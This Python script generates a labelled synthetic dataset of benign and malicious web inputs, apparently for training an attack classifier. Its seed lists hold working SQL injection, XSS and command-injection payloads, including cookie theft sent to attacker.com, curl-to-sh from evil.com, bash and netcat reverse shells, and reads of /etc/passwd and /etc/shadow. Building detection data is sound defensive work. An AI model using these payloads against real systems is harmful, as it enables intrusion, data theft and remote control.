import os
import random
import pandas as pd

# Fix random seed for reproducibility
random.seed(42)

# --- 1. SEED PAYLOADS ---
BENIGN_SAMPLES = [
    "john.doe@example.com", "Alice Smith", "104928", "order_id_9921",
    "search?q=laptop+gaming&page=2", "user/profile/settings", "true", "false",
    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "page=1&limit=50&sort=desc",
    "Electronics & Computers", "Spring Sale 2026", "Dallas, TX 75001",
    "https://api.myapp.com/v1/users/45", "filter[status]=active&filter[role]=editor",
    "{\"name\": \"John\", \"age\": 30, \"city\": \"New York\"}",
    "{\"product_id\": 8821, \"quantity\": 2, \"coupon\": \"WELCOME10\"}",
    "{\"email\": \"developer@company.org\", \"role\": \"admin\"}",
    "c8a1e2f3-9d0b-4b1a-8e2c-3d4e5f6a7b8c", "iPhone 15 Pro Max 256GB Space Grey",
    "category=books&author=george_orwell&year=1984", "status=pending_payment",
    "payment_method=credit_card&currency=USD", "items[0][id]=101&items[0][qty]=3",
    "redirect_url=/dashboard/home", "tag=python&tag=fastapi&tag=security"
]

SQLI_SAMPLES = [
    "' OR '1'='1", "' OR 1=1 --", "admin' --", "admin' #", "' OR '1'='1' /*",
    "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
    "' UNION SELECT 1, 'admin', 'password' --",
    "1 UNION SELECT null, username, password FROM users--",
    "'; DROP TABLE users; --", "'; EXEC xp_cmdshell('dir'); --",
    "1 AND SLEEP(5)--", "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "admin' AND 1=1#", "admin' AND 1=2#", "1' WAITFOR DELAY '0:0:5'--",
    "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)='",
    "' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
    "admin' OR 1=1 LIMIT 1;--", "1' AND ASCII(SUBSTRING((SELECT database()),1,1))=100--",
    "1' AND 1=1 UNION SELECT 1,2,3,4,5--", "' or ''='", "') or ('1'='1",
    "1; SELECT * FROM pg_user;--", "admin' or 'a'='a", "1 UNION SELECT @@version--"
]

XSS_SAMPLES = [
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    "<script src='http://attacker.com/evil.js'></script>",
    "<img src=x onerror=alert(1)>", "<img src=1 onerror=alert('hack')>",
    "<svg/onload=alert('XSS')>", "<svg onload=alert(document.cookie)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('XSS')>", "<input type='text' autofocus onfocus=alert(1)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<details open ontoggle=alert(1)>", "<video><source onerror='alert(1)'>",
    "<marquee onstart=alert(1)>", "'-alert(1)-'", "<a href=\"javascript:alert(1)\">click</a>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "\"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    "<div onmouseover=\"alert('xss')\">Hover me!</div>", "<object data=\"javascript:alert(1)\">"
]

CMD_TRAVERSAL_SAMPLES = [
    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
    "../../etc/shadow", "/etc/passwd", "C:\\boot.ini",
    "; cat /etc/passwd", "| cat /etc/passwd", "& cat /etc/passwd",
    "; whoami", "| whoami", "& whoami", "; ls -la", "| dir",
    "127.0.0.1; ping 8.8.8.8", "localhost | netstat -ano",
    "&& curl http://evil.com/shell.sh | sh", "; /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "| nc -e /bin/sh 10.0.0.1 4444", "; powershell -c (New-Object Net.WebClient).DownloadString('http://evil.com')",
    "..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../../var/log/apache2/access.log"
]

# --- 2. DATA AUGMENTATION GENERATOR ---
def generate_synthetic_dataset(target_count_per_class: int = 1500) -> pd.DataFrame:
    rows = []

    # Class 0: BENIGN
    for _ in range(target_count_per_class):
        base = random.choice(BENIGN_SAMPLES)
        variant_type = random.randint(1, 4)
        if variant_type == 1:
            p = f"{base}&page={random.randint(1, 100)}"
        elif variant_type == 2:
            p = f"{base}_{random.randint(1000, 99999)}"
        elif variant_type == 3:
            p = f"prefix_{base}"
        else:
            p = base
        rows.append({"payload": p, "label": 0, "category": "benign"})

    # Class 1: SQLi
    for _ in range(target_count_per_class):
        base = random.choice(SQLI_SAMPLES)
        r = random.random()
        if r < 0.3:
            p = base.upper()
        elif r < 0.6:
            p = f"id={random.randint(1, 100)}{base}"
        elif r < 0.8:
            p = f"{base} -- comment_{random.randint(1, 99)}"
        else:
            p = base
        rows.append({"payload": p, "label": 1, "category": "sqli"})

    # Class 2: XSS
    for _ in range(target_count_per_class):
        base = random.choice(XSS_SAMPLES)
        r = random.random()
        if r < 0.3:
            p = f"<div>{base}</div>"
        elif r < 0.6:
            p = f"username={base}&ref=login"
        else:
            p = base
        rows.append({"payload": p, "label": 2, "category": "xss"})

    # Class 3: CMD_TRAVERSAL
    for _ in range(target_count_per_class):
        base = random.choice(CMD_TRAVERSAL_SAMPLES)
        r = random.random()
        if r < 0.4:
            p = f"filename={base}"
        elif r < 0.7:
            p = f"ip=192.168.1.{random.randint(1, 254)}{base}"
        else:
            p = base
        rows.append({"payload": p, "label": 3, "category": "cmd_traversal"})

    df = pd.DataFrame(rows)
    df = df.sample(frac=1.0, random_state=42).reset_index(drop=True)
    return df


if __name__ == "__main__":
    out_dir = os.path.dirname(__file__)
    out_file = os.path.join(out_dir, "payloads.csv")
    print(f"[*] Generating balanced security dataset (6,000 samples across 4 classes)...")
    dataset = generate_synthetic_dataset(target_count_per_class=1500)
    dataset.to_csv(out_file, index=False)
    print(f"[+] Dataset successfully created at: {out_file}")
    print(f"[+] Class distribution:\n{dataset['category'].value_counts()}")